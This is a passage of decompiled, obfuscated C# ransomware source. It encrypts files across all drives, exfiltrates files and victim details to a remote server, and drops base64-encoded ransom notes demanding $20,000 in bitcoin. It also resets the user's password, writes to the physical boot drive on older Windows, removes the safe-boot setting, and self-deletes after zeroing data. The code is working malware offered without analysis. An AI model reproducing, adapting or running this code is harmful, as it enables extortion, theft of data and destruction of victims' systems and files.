			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text4);
		}
		foreach (string item6 in CSiGcEXgTf)
		{
			if (item6 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			{
				continue;
			}
			try
			{
				if (!File.Exists(item6 + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", item6 + "\\HOW_TO_DECYPHER_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item6 + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text4);
				}
			}
			catch (Exception)
			{
			}
		}
		if (JGjnyMyTennfuufcT == "YES")
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
				streamWriter.WriteLine(jKGdMalhZeKXBCvc("PGh0bWw+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsiPgo8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsiPjxzcGFuIHN0eWxlPSJjb2xvcjogI2ZmMDAwMDsgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7Ij48c3BhbiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsiPjxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjZmYwMDAwOyI+PGltZyBzcmM9Imh0dHBzOi8vY3V0ZXdhbGxwYXBlci5vcmcvMjEvc2t1bGwtd2FsbHBhcGVyLWZyZWUvU2t1bGwtV2FsbHBhcGVyLTNELVdhbGxwYXBlcnMtTGF0ZXN0LmpwZyIgYWx0PSIiIHdpZHRoPSI2NTAiIGhlaWdodD0iNDAzIiAvPjwvc3Bhbj48L3NwYW4+PC9zcGFuPjwvcD4KCjxoMiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij4KWW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLjwvaDI+PGJyPgo8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7IGZvbnQtd2VpZ2h0OiBib2xkOyI+CkRvbuKAmXQgd29ycnksIHlvdSBjYW4gcmV0dXJuIGFsbCB5b3VyIGZpbGVzITxicj4KSSBkb24ndCB3YW50IHRvIGxvb3NlIHlvdXIgZmlsZXMgdG9vLiBpZiBpIHdhbnQgdG8gZG8gc29tZXRoaW5nIGJhZCB0byB5b3UgaSB3b3VsZCd2ZSB3aXBlIGFsbCBvZiB5b3VyIG5ldHdvcmsgYnV0IHRoYXQncyBub3QgaGVscGluZyBtZS4gOik8YnI+CnNvIHRlbXBvcmFyeSBhbGwgb2YgeW91ciBmaWxlcyBpcyBtaW5lIG5vdyB1bnRpbCB5b3UgcGF5IHRoZSBwcmljZSBvZiB0aGVtLjxicj4KSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtIGNvbnRhY3QgbWUgZnJvbSB0aGUgYWRkcmVzcyBiZWxvdywgaSdsbCBiZSBoYXBweSB0byBoZWxwIHlvdSB0byBnZXQgb3V0IG9mIHRoaXMgc2l0dWF0aW9uLjxicj4KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLjxicj4KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4KCgo8L3A+CjxoMyBzdHlsZT0iY29sb3I6eWVsbG93OyB0ZXh0LWFsaWduOiBjZW50ZXI7Ij5UaGUgUHJpY2UgdG8gZ2V0IGFsbCB0aGluZ3MgdG8gdGhlIG5vcm1hbCA6IDIwLDAwMCQ8L2gzPgo8aDMgc3R5bGU9ImNvbG9yOnllbGxvdzsgdGV4dC1hbGlnbjogY2VudGVyOyI+IE15IEJUQyBXYWxsZXQgSUQgOiA8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij4xRjZzcThZdmZ0VGZ1RTRRY1l4Zks4czVYRlVVSEM3c0Q5PC9wPiA8L2gzPiAKPGgzIHN0eWxlPSJjb2xvcjp5ZWxsb3c7IHRleHQtYWxpZ246IGNlbnRlcjsiPkNvbnRhY3QgOiA8YnI+IGpvc2VwaG51bGxAc2VjbWFpbC5wcm8gPC9oMz4KCjxoMiBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBjb2xvcjpyZWQ7Ij5Db250YWN0OiBqb3NlcGhudWxsQHNlY21haWwucHJvIDwvaDI+CjwvYm9keT4KPC9odG1sPg=="));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(jKGdMalhZeKXBCvc("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
				streamWriter.WriteLine(text4 + jKGdMalhZeKXBCvc("PC9wPg=="));
				if (FsmxXwwVyXze == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(jKGdMalhZeKXBCvc("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + jKGdMalhZeKXBCvc("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(CfvwdOobMuXeStMb.Count) + jKGdMalhZeKXBCvc("PC9wPg=="));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", jKGdMalhZeKXBCvc("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + text4 + jKGdMalhZeKXBCvc("PC9wPg=="));
			}
		}
		if (YkwRnYlFytdkH == "YES")
		{
			try
			{
				if (FsmxXwwVyXze == "NO")
				{
					MfnxCHhUwIjyzc.qkCGSsikzw("URL", "USERNAME", "ACCESO", jKGdMalhZeKXBCvc("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(jKGdMalhZeKXBCvc("aHR0cDovL2ljYW5oYXppcC5jb20=")) + jKGdMalhZeKXBCvc("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + jKGdMalhZeKXBCvc("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(CfvwdOobMuXeStMb.Count) + "\r\n" + jKGdMalhZeKXBCvc("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(CfvwdOobMuXeStMb) + "\r\n" + jKGdMalhZeKXBCvc("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text4);
				}
				else
				{
					MfnxCHhUwIjyzc.qkCGSsikzw("URL", "USERNAME", "ACCESO", jKGdMalhZeKXBCvc("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + jKGdMalhZeKXBCvc("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + jKGdMalhZeKXBCvc("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(CfvwdOobMuXeStMb) + "\r\n" + jKGdMalhZeKXBCvc("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text4);
				}
			}
			catch
			{
			}
		}
		if (IBSndtoMdgy == "YES")
		{
			try
			{
				biNPKopUkiSJuO.UnNeRUofkpwgP(new Uri(""));
			}
			catch
			{
			}
		}
		if (JGjnyMyTennfuufcT == "NO")
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
			{
				Process.Start(jKGdMalhZeKXBCvc("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
			}
		}
		else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
		{
			Process.Start(jKGdMalhZeKXBCvc("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
		}
		if (ldDdAgsFLTkAX == "YES")
		{
			if (ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(rqOtfqTYGrTie) && !string.IsNullOrEmpty(wrCDlMOHoXr))
			{
				BvfGoSdlqjPP(rqOtfqTYGrTie, wrCDlMOHoXr);
			}
			else
			{
				BvfGoSdlqjPP();
			}
		}
		if (oarFYicwLcOiB != "LOGONISOFF")
		{
			TQsIfIHUHFwOo(oarFYicwLcOiB);
		}
		if (!string.IsNullOrEmpty(idAGkbKivQU))
		{
			try
			{
				File.Delete(idAGkbKivQU);
			}
			catch
			{
			}
		}
		if (nrUdlkCMdxZ == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string text = XfZBgoPdPvsMCS();
				if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
				{
					ILwfcQVhzflf.hvKwMSNYgA("\\\\.\\PhysicalDrive0");
				}
			}
			catch
			{
			}
		}
		if (jMDFRLEyorejfI.tTkvXnIXBUwQ())
		{
			tbluQOozLSqDhFc("bcdedit.exe", "/deletevalue {default} safeboot");
		}
		if (xQMkqhCYTvWMq == "EVET")
		{
			obllpHNmyTXvR();
		}
	}

	public static void zstTHeVErMkJUU()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(jKGdMalhZeKXBCvc("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), jKGdMalhZeKXBCvc("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int DPxcFgWfJlePTF(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> tsTJYQCcBKUvsb(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (text.ToLower().Contains("program files") || text.ToLower().Contains("windows") || text.ToLower().Contains("perflogs") || text.ToLower().Contains("internet explorer") || text.ToLower().Contains("programdata") || text.ToLower().Contains("appdata"))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_00ba;
			}
			catch
			{
			}
			continue;
			IL_00ba:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(jKGdMalhZeKXBCvc("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") && !fileInfo.FullName.EndsWith(".crypted") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(KYDuKlMFWLOzqeDUz))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(HJhinhnlOMNxIX) * 1024.0 * 1024.0 && FFbMRUzulqEpb == "YES")
						{
							list.Add(fileInfo.FullName);
							GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && FFbMRUzulqEpb == "NO")
						{
							list.Add(fileInfo.FullName);
							GXekGISbFWfkZ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string tbluQOozLSqDhFc(string BevAcsDSfs = "", string wxrufMgRtpdSU = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = BevAcsDSfs,
				Arguments = wxrufMgRtpdSU,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
		}
		catch
		{
		}
		return result;
	}

	public static void TQpGafavBJI(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string HiawheccNGktKh(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string jKGdMalhZeKXBCvc(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void XQYrYiACEjRdNrb(string gosrANbQZP = "", string JAqyYWMBBauaTk = "SW5mb3JtYXRpb24uLi4=", string aFKNOLefitUrT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		gosrANbQZP = HiawheccNGktKh("=42bn9Gbul2Vc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(jKGdMalhZeKXBCvc(gosrANbQZP), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(jKGdMalhZeKXBCvc("TGVnYWxOb3RpY2VDYXB0aW9u"), jKGdMalhZeKXBCvc(JAqyYWMBBauaTk));
			registryKey.SetValue(jKGdMalhZeKXBCvc("TGVnYWxOb3RpY2VUZXh0"), jKGdMalhZeKXBCvc(aFKNOLefitUrT));
			registryKey.Close();
		}
	}

	public static void glLILXcrbW()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(rqOtfqTYGrTie) && !string.IsNullOrEmpty(wrCDlMOHoXr))
				{
					XQYrYiACEjRdNrb("", rqOtfqTYGrTie, wrCDlMOHoXr);
				}
				else
				{
					XQYrYiACEjRdNrb();
				}
			}
		}
		catch
		{
		}
	}

	public static void BvfGoSdlqjPP(string OEUeABXDonO = "SW5mb3JtYXRpb24uLi4=", string AbsJbMlYipll = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(jKGdMalhZeKXBCvc(OEUeABXDonO));
		val.set_BalloonTipText(jKGdMalhZeKXBCvc(AbsJbMlYipll));
		val.ShowBalloonTip(30000);
	}

	public static void TQsIfIHUHFwOo(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		tbluQOozLSqDhFc("net.exe", "user " + text + " " + string_0);
	}

	public static bool LEYLEJpRfEgTMCc()
	{
		WebRequest webRequest = WebRequest.Create("https://www.google.com/");
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void obllpHNmyTXvR()
	{
		tbluQOozLSqDhFc("cmd.exe", jKGdMalhZeKXBCvc("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = jKGdMalhZeKXBCvc("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static string XfZBgoPdPvsMCS()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string iSQQzPCCLFgv(string string_0)
	{
		string text = Path.GetTempPath() + "\\HOW_TO_DECYPHER_FILES.txt";
		if (!File.Exists(text))
		{
			using StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.WriteLine(jKGdMalhZeKXBCvc("WW91ciBmaWxlcyB3ZXJlIHNhZmVseSBjeXBoZXJlZC4NCg0KQ29udGFjdDogbXktY29udGFjdC1lbWFpbEBwcm90b25tYWlsLmNvbQ=="));
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine(jKGdMalhZeKXBCvc("S2V5IElkZW50aWZpZXI6IA=="));
			streamWriter.WriteLine(string_0);
		}
		else
		{
			File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + string_0);
		}
		return text;
	}

	private static void QvJELJzMCQJDDH(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		ldXpuSFdlzXsf ldXpuSFdlzXsf = new ldXpuSFdlzXsf();
		ldXpuSFdlzXsf.wRpHEPAtkvsJOZo = string_1;
		ldXpuSFdlzXsf.vyUBfhhKAo = string_2;
		ldXpuSFdlzXsf.PrmBaLAeEGy = string_3;
		ldXpuSFdlzXsf.VWJpqjqHbP = string_4;
		ctSkisxFbkPzS = Encoding.ASCII.GetBytes(ldXpuSFdlzXsf.PrmBaLAeEGy);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !siKfLgBTOtPOl.Contains(drives[i].Name))
					{
						siKfLgBTOtPOl.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!siKfLgBTOtPOl.Contains(string_0[i]))
				{
					siKfLgBTOtPOl.Add(string_0[i]);
				}
			}
		}
		if (siKfLgBTOtPOl.Contains(jKGdMalhZeKXBCvc("Qzpc")) && XKCeykQXWEYgem == "YES")
		{
			siKfLgBTOtPOl.Remove(jKGdMalhZeKXBCvc("Qzpc"));
		}
		using List<string>.Enumerator enumerator = siKfLgBTOtPOl.GetEnumerator();
		while (enumerator.MoveNext())
		{
			uKOVEKzchnPsIO CS_0024_003C_003E8__locals0 = new uKOVEKzchnPsIO();
			CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj = ldXpuSFdlzXsf;
			CS_0024_003C_003E8__locals0.KxwFjccKfD = enumerator.Current;
			if (FsmxXwwVyXze == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					FAKScXrbtoSt(CS_0024_003C_003E8__locals0.KxwFjccKfD, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.VWJpqjqHbP, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.vyUBfhhKAo, CS_0024_003C_003E8__locals0.rvBvEQIyVzuxrLj.PrmBaLAeEGy);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				FAKScXrbtoSt(CS_0024_003C_003E8__locals0.KxwFjccKfD, ldXpuSFdlzXsf.wRpHEPAtkvsJOZo, ldXpuSFdlzXsf.VWJpqjqHbP, ldXpuSFdlzXsf.vyUBfhhKAo, ldXpuSFdlzXsf.PrmBaLAeEGy);
			}
		}
	}

	public static void FAKScXrbtoSt(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (oiSsXsWUMOtEp == "NO")
		{
			list = tsTJYQCcBKUvsb(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = jtxivXeSYrLUbhy.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_033a;
					}
				}
				if ((oCUqHyphdF == "NO" && !item.EndsWith(text)) || CfvwdOobMuXeStMb.Contains(item))
				{
					continue;
				}
				if (zKSeEXflLrlh == "YES")
				{
					try
					{
						if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
						{
							MZxLtJzLRoIRU.RZJqgaZnLiq(item);
						}
					}
					catch
					{
					}
				}
				CfvwdOobMuXeStMb.Add(item);
				if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
				{
					CSiGcEXgTf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !list3.Contains(text))
					{
						if (uySjNlajuEE == "YES")
						{
							foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
							{
								if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
								{
									if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
						byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						QCdYGIiDjEcstt(item, item + string_2, ctSkisxFbkPzS);
					}
					else
					{
						QCdYGIiDjEcstt(item, item + ".part", ctSkisxFbkPzS);
					}
				}
				catch (Exception)
				{
				}
				IL_033a:;
			}
		}
	}

	public static void GXekGISbFWfkZ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		WbDnpXySnYPBD CS_0024_003C_003E8__locals0 = new WbDnpXySnYPBD();
		CS_0024_003C_003E8__locals0.fevfiSigOoErXD = list_0;
		CS_0024_003C_003E8__locals0.RryKduFtzbfiPI = string_1;
		CS_0024_003C_003E8__locals0.DhKhIlMiANCZ = string_2;
		CS_0024_003C_003E8__locals0.KRFQhWmJuhVexr = string_3;
		CS_0024_003C_003E8__locals0.UIEWVHYeVoR = new List<string> { "" };
		Parallel.ForEach(string_0, delegate(string string_0)
		{
			foreach (string item in CS_0024_003C_003E8__locals0.fevfiSigOoErXD)
			{
				if (CS_0024_003C_003E8__locals0.DhKhIlMiANCZ.Length != 0)
				{
					string[] dhKhIlMiANCZ = CS_0024_003C_003E8__locals0.DhKhIlMiANCZ;
					int num = 0;
					while (num < dhKhIlMiANCZ.Length)
					{
						string value = dhKhIlMiANCZ[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f0;
					}
				}
				if ((!(oCUqHyphdF == "NO") || item.EndsWith(string_0)) && !CfvwdOobMuXeStMb.Contains(item))
				{
					if (zKSeEXflLrlh == "YES")
					{
						try
						{
							if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
							{
								MZxLtJzLRoIRU.RZJqgaZnLiq(item);
							}
						}
						catch
						{
						}
					}
					CfvwdOobMuXeStMb.Add(item);
					if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
					{
						CSiGcEXgTf.Add(Path.GetDirectoryName(item));
					}
					try
					{
						FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.UIEWVHYeVoR.Contains(string_0))
						{
							if (uySjNlajuEE == "YES")
							{
								foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
								{
									if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
									{
										if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
										{
											try
											{
												MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
											}
											catch
											{
											}
										}
									}
									else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
							}
							fileStream.Dispose();
							byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
							byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.KRFQhWmJuhVexr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
							yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
							if (CS_0024_003C_003E8__locals0.RryKduFtzbfiPI != ".*")
							{
								File.Move(item, item + CS_0024_003C_003E8__locals0.RryKduFtzbfiPI);
							}
						}
						else if (CS_0024_003C_003E8__locals0.RryKduFtzbfiPI != ".*")
						{
							KfLhmyplGPYqxR(item, item + CS_0024_003C_003E8__locals0.RryKduFtzbfiPI, ctSkisxFbkPzS);
						}
						else
						{
							KfLhmyplGPYqxR(item, item + ".part", ctSkisxFbkPzS);
						}
					}
					catch (Exception)
					{
					}
				}
				IL_02f0:;
			}
		});
	}

	private static void QCdYGIiDjEcstt(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
